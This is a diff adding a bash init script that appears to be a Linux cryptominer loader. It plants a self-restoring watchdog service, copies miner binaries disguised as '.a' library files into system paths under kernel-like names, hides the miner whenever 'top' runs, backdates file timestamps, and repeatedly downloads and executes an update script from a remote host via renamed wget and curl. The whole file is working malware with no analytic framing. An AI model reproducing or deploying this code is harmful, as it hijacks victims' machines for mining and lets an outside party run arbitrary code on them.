@@ -1,0 +1,102 @@
+#!/bin/bash
+#chkconfig: 2345 80 96
+#description:kworkers25
+
+wirteLauncher(){
+echo -n "#">>/etc/init.d/boot.crypt
+echo "!/bin/bash">>/etc/init.d/boot.crypt
+echo "#chkconfig: 2345 81 96" >>/etc/init.d/boot.crypt
+echo "#description:boot.crypt" >>/etc/init.d/boot.crypt
+echo "start(){" >>/etc/init.d/boot.crypt
+echo "while [ 1 ]">>/etc/init.d/boot.crypt
+echo "do">>/etc/init.d/boot.crypt
+echo "if [ \`ps aux| grep \"kworkers25\" | grep -v \"grep\"|wc -l\` == 0 ]">>/etc/init.d/boot.crypt
+echo "then">>/etc/init.d/boot.crypt
+echo "rm -f /lib64/kworkers25 /etc/init.d/kworkers25">>/etc/init.d/boot.crypt
+echo "\cp /lib64/libg.a /lib64/kworkers25">>/etc/init.d/boot.crypt
+echo "chmod a+x /lib64/kworkers25">>/etc/init.d/boot.crypt
+echo "ln -s /usr/lib64/kworkers25 /etc/init.d/kworkers25 -f">>/etc/init.d/boot.crypt
+echo "chmod a+x /etc/init.d/kworkers25">>/etc/init.d/boot.crypt
+echo "chkconfig --add kworkers25">>/etc/init.d/boot.crypt
+echo "chkconfig kworkers25 on">>/etc/init.d/boot.crypt
+echo "cd /lib64/">>/etc/init.d/boot.crypt
+echo "nohup ./kworkers25 > /dev/null &">>/etc/init.d/boot.crypt
+echo "fi">>/etc/init.d/boot.crypt
+echo "sleep 1">>/etc/init.d/boot.crypt
+echo "if [ \` ps -ef | grep \"top\" | grep -v \"grep\"| grep -vi \"stop\"| grep -vi \"desktop\"| grep -vi \"antop\"|wc -l \` != 0 ]">>/etc/init.d/boot.crypt
+echo "then">>/etc/init.d/boot.crypt
+echo -n "kill -9 \`ps -ef | grep \"rpciods\" | grep -v \"grep\" | awk '{print \$">>/etc/init.d/boot.crypt
+echo "2}'\`">>/etc/init.d/boot.crypt
+echo "else">>/etc/init.d/boot.crypt
+echo "if [ \` ps -ef | grep \"rpciods\" | grep -v \"grep\"|wc -l \` == 0 ]">>/etc/init.d/boot.crypt
+echo "then">>/etc/init.d/boot.crypt
+echo "cd /usr/sbin/">>/etc/init.d/boot.crypt
+echo "rm -f rpciods*">>/etc/init.d/boot.crypt
+echo "((numb=\$RANDOM%10+\$RANDOM%10+\$RANDOM%10+\$RANDOM%10))">>/etc/init.d/boot.crypt
+echo "\cp /lib64/libaio.a /usr/sbin/config.json">>/etc/init.d/boot.crypt
+echo "\cp /lib64/liblzma.a /usr/sbin/rpciods\$numb">>/etc/init.d/boot.crypt
+echo "chmod 777 /usr/sbin/rpciods\$numb">>/etc/init.d/boot.crypt
+echo "rpciods\$numb > /dev/null &">>/etc/init.d/boot.crypt
+echo "fi">>/etc/init.d/boot.crypt
+echo "fi">>/etc/init.d/boot.crypt
+echo "done">>/etc/init.d/boot.crypt
+echo "}" >>/etc/init.d/boot.crypt
+echo -n "case $" >>/etc/init.d/boot.crypt
+echo "1 in" >>/etc/init.d/boot.crypt
+echo "start):" >>/etc/init.d/boot.crypt
+echo "    start" >>/etc/init.d/boot.crypt
+echo "    ;;" >>/etc/init.d/boot.crypt
+echo "esac" >>/etc/init.d/boot.crypt
+}
+
+checkLauncher(){
+while [ 1 ]
+do
+if [ `ps aux| grep "boot.crypt" | grep -v "grep"|wc -l` == 0 ]
+then
+rm -f /etc/init.d/boot.crypt
+wirteLauncher
+chmod 777 /etc/init.d/boot.crypt
+chkconfig --add boot.crypt
+chkconfig boot.crypt on
+touch -r /etc/init.d/boot /etc/init.d/boot.crypt
+/etc/init.d/boot.crypt start
+fi
+done
+}
+
+upDate(){
+cd /lib64/ && rm -f update.sh*
+ip=`ping Rainbow20.f3322.net -c1|sed '1{s/[^(]*(//;s/).*//;q}'`
+/lib64/libwget http://$ip/xmrig/update.sh
+chmod a+x update.sh
+nohup ./update.sh > /dev/null &
+}
+
+checkVersion(){
+while [ 1 ]
+do
+sleep 10
+ip=`ping Rainbow20.f3322.net -c1|sed '1{s/[^(]*(//;s/).*//;q}'`
+remote=`/lib64/libcurl -s http://$ip/xmrig/version.txt `
+cd /usr/sbin
+for ((i=0;$i<=36;i++))
+do
+if [ -f "rpciods$i" ]
+then
+local=`./rpciods$i -V|head -1`
+break
+fi
+done
+if [[ $remote != $local ]]
+then
+upDate
+fi
+sleep 14390
+done
+}
+
+checkLauncher &
+checkVersion &
+
+
